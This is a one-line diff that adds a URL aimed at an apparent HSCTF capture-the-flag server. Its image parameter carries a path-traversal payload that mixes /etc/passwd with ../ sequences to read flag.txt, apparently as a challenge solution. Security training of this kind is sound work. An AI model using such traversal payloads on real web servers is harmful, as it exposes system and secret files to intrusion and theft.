@@ -1,0 +1,1 @@
+http://web1.hsctf.com:8003/image?image=/images//etc/passwd.jpg../../../..//flag.txt
